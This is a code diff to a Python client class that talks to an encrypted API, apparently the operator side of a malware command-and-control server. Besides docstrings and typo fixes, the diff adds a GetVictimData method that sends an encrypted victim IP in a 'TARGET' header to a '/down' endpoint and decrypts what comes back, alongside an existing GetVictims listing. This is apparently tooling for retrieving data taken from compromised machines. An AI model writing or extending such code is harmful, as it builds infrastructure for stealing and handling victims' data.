@@ -62,12 +62,28 @@ class Core(CryptoCore):
             self.CryptographicParam(params["key"], params["IV"])
 
     def IsValidIpv4(self, ip: str) -> bool:
+        """
+        Check if ip is valid or not.
+        args:
+            @ip (str): ip address.
+
+        return:
+            (bool); True if its valid, flase if not.
+        """
         if re.match(pattern=r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$", string=ip):
             return True
         else:
             return False
 
     def IsValidPort(self, port: str) -> bool:
+        """
+        Check if port is valid or not.
+        args:
+            @port (str): port.
+
+        return:
+            (bool); True if its valid, flase if not.
+        """
         try:
             port = int(port)
             if port > 65535:
@@ -76,7 +92,7 @@ class Core(CryptoCore):
         except ValueError:
             return False
 
-    def check(self) -> bool:
+    def check(self):
         """Check if the api is reachable and validate the cryptographic parameters."""
         if self.ApiUrl is None:
             print("[-] The api URL is missing, You should set it before checking the api.")
@@ -90,13 +106,15 @@ class Core(CryptoCore):
 
                 if response.status_code == 200:
                     self.IsReady = True
-                    print("[+] The check is done, everything is correct.")
+                    print("[+] All good.")
                 else:
                     print("[-] Incorrect cryptographic parameters. You should verify that the used parameters are the same ones on the api.")
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-                print("[-] The api is not reqponding, You should verify that the api URL is correct.")
+                print("[-] The api is not responding, You should verify that the api URL is correct.")
+                self.IsReady = False
         else:
             print("[-] The cryptographic parameters are missing, You should set them or load a setting file before checking the api.")
+            self.IsReady = False
 
     def GetVictims(self) -> dict:
         if self.IsReady is True:
@@ -104,7 +122,7 @@ class Core(CryptoCore):
 
             try:
                 response = requests.get(url=url)
-                data = self.DecryptBuffer(response.text)
+                data = self.DecryptBuffer(response.text).decode("utf-8")
                 return json.loads(data)
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                 print("[-] The api is down.")
@@ -124,8 +142,29 @@ class Core(CryptoCore):
                     for chunk in response.iter_content(chunk_size=102400):
                         if chunk:
                             data += chunk.decode("utf-8")
-                    data = self.DecryptBuffer(data)
+                    data = self.DecryptBuffer(data).decode("utf-8")
                     return json.loads(data)
+                elif response.status_code == 204:
+                    print("[-] The victim does not exists.")
+            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
+                print("[-] The api is down.")
+
+        return None
+
+    def GetVictimData(self, VictimIP):
+        if self.IsReady is True:
+            url = self.ApiUrl + "/down"
+            ip = self.EncryptBuffer(VictimIP)
+            header = {"TARGET": ip}
+
+            try:
+                response = requests.get(url=url, headers=header, stream=True)
+                data = ""
+                if response.status_code == 200:
+                    for chunk in response.iter_content(chunk_size=102400):
+                        if chunk:
+                            data += chunk.decode("utf-8")
+                    return self.DecryptBuffer(data)
                 elif response.status_code == 204:
                     print("[-] The victim does not exists.")
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
